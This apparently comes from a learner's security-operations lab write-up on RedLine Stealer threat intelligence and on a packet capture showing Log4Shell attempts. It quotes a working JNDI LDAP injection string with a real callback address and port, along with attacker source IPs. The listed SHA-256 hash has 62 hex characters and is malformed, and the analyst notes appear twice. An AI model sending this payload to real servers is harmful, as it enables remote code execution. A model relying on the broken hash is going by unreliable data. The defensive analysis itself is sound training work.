# Findings - Day 32

## Scope
This document records the main findings from the day's practical investigations.
The work covered malware threat intelligence and network traffic analysis.

## Malware Hash
SHA-256:
`248FCC901AFFE4B4C8C91E4D78A939BF681C9A1BC24ADDC3551B32768F907B`

The hash was used as the primary intelligence lookup value.

## Malware Family
The sample was identified as RedLine Stealer.
The identification was supported by MalwareBazaar intelligence.
YARA signatures also matched RedLine-related rules.

## Classification
The malware was categorized as a Trojan in the lab workflow.
The intelligence sources described the sample as malicious.
The family-level identification provided context for further hunting.

## YARA
The MalwareBazaar page displayed several matching YARA signatures.
One rule was:
`detect_Redline_Stealer`
Another rule described a RedLine Stealer payload.
Additional rules identified PE or packing-related characteristics.

## Behavioral Findings
The intelligence showed suspicious file creation.
It showed process creation from recently created files.
It showed hidden-window process execution.
It showed service activity.
It showed custom TCP requests.
It showed defense-impairment behavior.
The report included blocking Windows Defender launch.
The report also included disabling the operating system update service.
Unauthorized injection into a system process was reported.

## Network Intelligence
ThreatFox was used to investigate associated infrastructure.
The investigation identified RedLine-related C2 intelligence.
The record contained an IP address and port.
The threat type was associated with botnet C2.
The intelligence connected the malware family to network infrastructure.

## PCAP
The network exercise used:
`Challenge.pcap`
The capture contained TCP and HTTP traffic.
The traffic included suspicious JNDI LDAP strings.

## Log4Shell Payload
Observed payload:
`${jndi:ldap://31.131.16.127:1389/Exploit}`

Callback IP:
`31.131.16.127`

Callback port:
`1389`

The payload is consistent with Log4Shell exploitation.
The callback address appeared inside the HTTP request.

## Source IPs
The relevant source addresses were:
`46.105.95.220`
`104.248.144.120`

These were the unique source addresses observed in the filtered results.
The unique source count was 2.

## Packet Count Versus Unique IP Count
The filtered results contained multiple packets.
Several packets originated from the same source.
Therefore, packet count could not be used as the number of attacking IPs.
The Source column was inspected and duplicate values were removed.

## Filter Validation
The payload search used:
`tcp contains "31.131.16.127"`

The filter was appropriate because the address appeared inside packet content.
The filter:
`ip.addr == 31.131.16.127`
was not appropriate for this payload-only occurrence.

## Main Findings
- RedLine Stealer was identified.
- The sample was categorized as a Trojan.
- YARA signatures supported the family identification.
- ThreatFox supplied infrastructure intelligence.
- Log4Shell-style JNDI traffic was observed.
- The callback IP was `31.131.16.127`.
- The LDAP callback port was `1389`.
- Two unique source IPs were identified.
- The source IPs were `46.105.95.220` and `104.248.144.120`.

## SOC Impact
The hash can be searched in endpoint telemetry.
The malware family can guide threat hunting.
The callback IP can be searched in network logs.
The LDAP port can be monitored for suspicious connections.
The JNDI pattern can support detection rules.
The source IPs can be correlated with firewall and proxy records.

## Confidence
The malware family had multiple supporting intelligence sources.
The network payload was directly observed in the PCAP.
The source addresses were visible in Wireshark.
The findings were based on observed evidence.

## Analyst Note
The investigation demonstrated the importance of manual packet inspection.
Filters narrow the investigation.
Packet details validate the result.
Payload inspection provides context.
Threat intelligence enriches the network evidence.
## Analyst Notes
Record important timestamps with findings.
Preserve indicators exactly as observed.
Keep evidence separate from interpretation.
Record why each filter was selected.
Validate important findings with more than one view.
Use screenshots to preserve visual evidence.
Correlate network findings with endpoint telemetry.
Do not assume that an IOC's context is obvious.
Record unexpected filter results as investigation lessons.
Keep unique values separate from raw packet counts.
Use threat intelligence as enrichment rather than unquestioned truth.
Confirm high-impact findings before disruptive response.
Document both the final answer and the reasoning.
These notes are intended for future SOC investigations.
Repeatable investigation methods are more valuable than platform-specific tricks.
## Analyst Notes
Record important timestamps with findings.
Preserve indicators exactly as observed.
Keep evidence separate from interpretation.
Record why each filter was selected.
Validate important findings with more than one view.
Use screenshots to preserve visual evidence.
Correlate network findings with endpoint telemetry.
Do not assume that an IOC's context is obvious.
Record unexpected filter results as investigation lessons.
Keep unique values separate from raw packet counts.
Use threat intelligence as enrichment rather than unquestioned truth.
Confirm high-impact findings before disruptive response.
Document both the final answer and the reasoning.
